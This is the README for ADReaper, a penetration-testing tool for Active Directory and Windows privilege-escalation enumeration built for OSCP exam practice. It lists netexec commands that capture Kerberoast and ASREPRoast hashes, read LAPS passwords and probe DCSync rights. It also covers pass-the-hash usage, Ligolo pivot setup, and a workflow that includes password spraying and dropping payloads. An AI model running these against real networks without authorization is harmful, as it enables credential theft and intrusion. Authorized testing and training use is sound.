# 🐉 ADReaper

```
         \||/     __----~~~~~~~~~~------___
          ||    -~                          ~~-_
    >:==<||  /_   o O o  ADReaper  o O o      \
          || /    ~~---,________,---~~          }
         \||/          |        |              /}
          '     <=====>|   /\   |<=====>     //
                _/|   _|  /  \  |_   |\_    //
               / ||  (_)-/    \-(_)  || \  //
              /  || /            \   ||  \/
             /  / \/  /\      /\  \  / \  )
            /  /  /  /  \    /  \  \/   \/
           (  /  /  / )) \  / (( \  \   /
            \/  (  / //\\ \/  //\\ \  \/
             \   \/  \\//  /  \\//  \/
              \   /   \/  /    \/   /
  ~.~.~.~.~.~.\_/~.~.\/~.~.~.\/~./~.~.~.~.~.~
  ~.~.~.~ FIRE & FURY ~ ENUMERATE ~ DOMINATE ~.~
```

**ADReaper — Active Directory & Windows Privilege Escalation Recon Tool**  
**OSCP-compliant: enumeration only, no exploitation.**

---

## What it does

ADReaper is a Python-based Active Directory recon and Windows privilege escalation enumeration tool built for OSCP exam use. It runs entirely from Kali, connects to the Domain Controller over LDAP, **and also executes live enumeration commands** via `netexec`/`nxc` against both the DC and your target host — giving you a complete attack surface with real output, not just a list of commands to copy.

Key design principle: **`-dc` and `-t` are separate targets.**

- `-dc` = the Domain Controller — all LDAP, Kerberos, BloodHound, ASREPRoast, Kerberoast, and AD queries always go here
- `-t` = the host you are attacking — all SMB, WinRM, RDP, share enumeration, session listing, and host-level checks go here

This matters on OSCP where the exam network has **three machines**: a dual-NIC entry box, an internal workstation, and a DC — connected via a pivot (Ligolo/Chisel). ADReaper handles all three scenarios.

**Output:** a full interactive HTML report you open in your browser — filterable findings, collapsible cards, copy buttons on every command block.

---

## What it actually runs

### LDAP modules (against DC)
| Module | What it finds |
|--------|--------------|
| Domain baseline | Password policy, lockout threshold, MAQ, DCs |
| User enumeration | ASREPRoastable, Kerberoastable, creds in descriptions, PASSWD_NOTREQD |
| Computer enumeration | Unconstrained delegation, legacy OS, stale machines |
| Group enumeration | Privileged group memberships (Domain Admins, Backup Operators, DNS Admins…) |
| Delegation | Constrained + unconstrained + RBCD paths with exact attack commands |
| Domain trusts | Cross-domain attack paths |
| GPO analysis | GPO names, paths, writable GPO detection commands |
| ACL / DCSync | dacledit.py live check, AdminSDHolder accounts, BloodHound ingestion |

### NXC live execution (split: AD cmds → DC, host cmds → target)

**AD / LDAP / Kerberos section** — always fires at `-dc`:
- `nxc ldap <DC> --users` — full user list
- `nxc ldap <DC> --active-users` — enabled accounts only
- `nxc ldap <DC> --admin-count` — AdminCount=1 accounts
- `nxc ldap <DC> --asreproast` — captures hashes directly to file
- `nxc ldap <DC> --kerberoasting` — captures hashes directly to file
- `nxc ldap <DC> --no-preauth-targets` — no-preauth kerberoast
- `nxc ldap <DC> -M user-desc` — credential hunting in descriptions
- `nxc ldap <DC> -M get-desc-users` — description enumeration
- `nxc ldap <DC> -M laps` — LAPS password read
- `nxc ldap <DC> --shares` — DC share enumeration
- `nxc ldap <DC> --bloodhound --collection All` — BloodHound auto-collection
- Certipy-ad ADCS vulnerable template scan
- secretsdump.py DCSync rights probe (krbtgt)

**Host operations section** — always fires at `-t`:
- `nxc smb <HOST> --continue-on-success` — auth + Pwn3d detection
- `nxc smb <HOST> --shares` — readable/writable shares
- `nxc smb <HOST> --loggedon-users` — active sessions to steal
- `nxc smb <HOST> --sessions` — open SMB sessions
- `nxc smb <HOST> --pass-pol` — password policy
- `nxc smb <HOST> --local-groups` — local group membership
- `nxc smb <HOST> --local-auth --users` — local SAM accounts
- `nxc winrm <HOST>` — WinRM access (flags + evil-winrm command)
- `nxc rdp <HOST>` — RDP access check
- `nxc mssql <HOST>` — MSSQL access + xp_cmdshell path
- `nxc smb <HOST> -M gpp_password` — GPP passwords
- `nxc smb <HOST> -M gpp_autologin` — GPP autologin
- `nxc smb <HOST> -M spider_plus` — SYSVOL/share spider
- nmap SMB vuln scan (ms17-010, ms10-061, smb2-security-mode)
- enum4linux-ng full scan (if installed)

### Windows PrivEsc reference (14 vectors)
Tailored commands generated using your `--lhost`, `--lport`, and `-t` values:

| Severity | Vector |
|----------|--------|
| CRITICAL | SeImpersonatePrivilege → PrintSpoofer / GodPotato / JuicyPotatoNG |
| CRITICAL | SeDebugPrivilege → LSASS dump via ProcDump + Mimikatz |
| CRITICAL | SeBackupPrivilege → NTDS.dit via diskshadow |
| HIGH | SeTakeOwnershipPrivilege → SAM / sensitive file access |
| HIGH | AlwaysInstallElevated → MSI as SYSTEM |
| HIGH | Unquoted service paths |
| HIGH | Weak service binary permissions |
| HIGH | Writable scheduled task scripts |
| HIGH | MSSQL xp_cmdshell → token impersonation |
| HIGH | Credential hunting (history, registry, LaZagne, SessionGopher) |
| HIGH | Kernel exploits — WES-NG / Sherlock workflow |
| MEDIUM | DLL hijacking |
| INFO | PrivescCheck (itm4n) — drop + run commands with your lhost |
| INFO | WinPEAS / PowerUp / SharpUp |

### Output files
| File | Contents |
|------|----------|
| `adreaper_report.html` | Full interactive browser report — filter by severity, copy buttons, collapsible cards |
| `adreaper_results.json` | Machine-readable full results |
| `users.txt` | Extracted username list (auto-built from NXC output) |
| `asrep_hashes.txt` | ASREPRoast hashes if captured |
| `kerb_hashes.txt` | Kerberoast hashes if captured |

---

## Installation

```bash
pip3 install ldap3 rich --break-system-packages
chmod +x adreaper.py

# Optional but recommended — enables live NXC execution
pip3 install netexec --break-system-packages

# Copy to PATH for global use
sudo cp adreaper.py /usr/bin/adreaper
```

---

## Usage

Run with no arguments to see the full usage guide in the terminal:

```bash
adreaper
```

### Mode 1 — DC mode (running directly against the Domain Controller)

```bash
adreaper -d corp.local -dc 10.10.10.10 -u john -p Password123
```

AD queries and host ops both target `10.10.10.10`.

### Mode 2 — Host mode (compromised workstation, DC is a separate machine)

```bash
adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.50 -u john -p Password123
```

- LDAP/Kerberos/BloodHound/ASREP/Kerberoast → `10.10.10.10` (DC)
- SMB/WinRM/RDP/shares/sessions → `10.10.10.50` (target workstation)

### Mode 3 — Pivot mode (OSCP: Ligolo/Chisel tunnel to internal network)

```bash
# Step 1 — set up Ligolo on Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Step 2 — run agent on the dual-NIC entry box
./agent -connect <KALI_IP>:11601 -ignore-cert

# Step 3 — in the Ligolo console
session → start
sudo ip route add 10.10.10.0/24 dev ligolo

# Step 4 — run ADReaper against internal targets through the tunnel
adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.20 \
         -u john -p Password123 --lhost 10.50.0.5
```

### Mode 4 — Pass-the-hash

```bash
adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.50 \
         -u john --hash :64f12cddaa88057e06a81b54e73b949b
```

### Mode 5 — Host-only scan (skip all AD modules)

```bash
adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.50 \
         -u john -p Password123 --no-ad --no-bloodhound
```

Useful when you just want to enumerate a specific host quickly without re-running all the AD queries.

---

## All flags

| Flag | Description |
|------|-------------|
| `-d`, `--domain` | Domain name — **required** — e.g. `corp.local` |
| `-dc`, `--dc-ip` | Domain Controller IP — **required** — all AD/LDAP/Kerberos queries go here |
| `-t`, `--target` | Target host IP — SMB/WinRM/RDP checks go here — defaults to `-dc` if not set |
| `-u`, `--user` | Username |
| `-p`, `--password` | Password |
| `--hash` | NTLM hash (`:NT` or `LM:NT`) for pass-the-hash |
| `--lhost` | Your Kali / tun0 IP — used in reverse shell commands throughout report |
| `--lport` | Listener port (default: `4444`) |
| `-o`, `--output` | Output directory (default: `./adreaper_out`) |
| `--no-privesc` | Skip Windows PrivEsc reference section |
| `--no-bloodhound` | Skip BloodHound auto-collection |
| `--no-ad` | Skip all LDAP/AD modules — host-only scan |

---

## OSCP workflow

```
1. Get initial creds (spray, anonymous LDAP, OSINT, password in description)
        ↓
2. Run ADReaper against DC immediately
   adreaper -d corp.local -dc <DC_IP> -u <user> -p <pass> --lhost <kali_ip>
        ↓
3. Open adreaper_report.html in browser
   Filter to CRITICAL → work those first
        ↓
4. Common findings on a default OSCP lab:
   [CRITICAL] Password in description → try creds immediately
   [CRITICAL] ASREP hashes captured   → hashcat -m 18200
   [HIGH]     Kerberoastable accounts  → hashcat -m 13100
   [HIGH]     Unconstrained delegation → coerce DC auth → DCSync
   [HIGH]     Writable SMB share       → drop payload
   [MEDIUM]   No lockout policy        → spray safely
        ↓
5. On each compromised host — run with -t pointing at that machine
   adreaper -d corp.local -dc <DC_IP> -t <HOST_IP> -u <user> -p <pass>
        ↓
6. Check PrivEsc section in the HTML report — commands pre-filled with your IPs
        ↓
7. Pivot to next subnet — set up Ligolo, add route, re-run with new -t
```

---

## Dependencies

- Python 3.x
- `ldap3` — LDAP queries to the DC
- `rich` — terminal and report formatting
- `netexec` / `nxc` — live NXC execution (strongly recommended, most modules need this)
- Optional: `impacket` tools (`secretsdump.py`, `GetUserSPNs.py`, `GetNPUsers.py`)
- Optional: `bloodhound-python` — BloodHound data collection
- Optional: `certipy-ad` — ADCS vulnerable template detection
- Optional: `enum4linux-ng` — comprehensive host enumeration

All of these are pre-installed on a standard Kali Linux image.

---

## OSCP Policy

ADReaper performs **enumeration only**. It does not:
- Exploit any vulnerability
- Modify any Active Directory objects
- Execute payloads or shellcode
- Perform lateral movement

Hash files (`asrep_hashes.txt`, `kerb_hashes.txt`) are captured by the Kerberos protocol during normal authentication flows — this is enumeration, not exploitation. All attack commands in the report must be run manually by the operator.
